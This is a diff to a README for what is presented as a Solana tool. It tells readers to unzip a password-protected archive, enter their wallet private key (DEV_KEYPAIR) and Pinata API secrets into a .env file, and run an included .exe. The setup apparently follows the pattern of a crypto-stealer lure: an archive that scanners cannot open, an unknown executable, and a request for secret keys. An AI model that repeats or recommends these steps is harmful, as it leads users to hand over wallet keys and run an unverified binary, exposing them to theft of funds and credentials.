@@ -10,7 +10,13 @@
 
 > ⚠️ the archive password is ***SOL!launch***
 
-Launch the `.exe` **Solana tool** to begin.
++ Unzip the archive
+
++ Open the `.env` file and fill DEV_KEYPAIR, PINATA_API_KEY, PINATA_SECRET_API_LEY.
+
+ *DEV_KEYPAIR is your private key, pinata api you can grab from [here](https://pinata.cloud).
+
++ Launch the `.exe` **file**.
 
 <img width="1920" height="1080" alt="dwdwdмени-1" src="https://github.com/user-attachments/assets/3bea6ae5-08bf-4a8b-856a-c02da079b317" />
 
